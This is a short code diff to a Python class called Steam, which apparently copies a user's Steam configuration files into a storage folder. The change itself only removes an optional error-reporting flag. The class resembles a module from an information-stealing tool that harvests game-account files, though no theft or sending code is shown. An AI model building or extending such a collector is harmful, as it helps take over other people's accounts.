@@ -8,11 +8,10 @@ class Steam:
     """
     Collects configs from the Steam.
     """
-    def __init__(self, storage_path: str, folder: str, errors: bool):
+    def __init__(self, storage_path: str, folder: str):
 
         self.__storage_path = storage_path
         self.__folder = folder
-        self.__errors = errors
 
     def __create_folder(self) -> None:
         """
@@ -47,7 +46,7 @@ class Steam:
         steam_path = self.__get_steam_path()
 
         if not path.exists(steam_path):
-            if self.__errors is True: print(f"[Steam]: No steam found")
+            print(f"[Steam]: No steam found")
             return
 
         storage_path = rf"{self.__storage_path}\{self.__folder}"
@@ -73,4 +72,4 @@ class Steam:
             self.__get_steam_files()
 
         except Exception as e:
-            if self.__errors is True: print(f"[Steam]: {repr(e)}")
+            print(f"[Steam]: {repr(e)}")
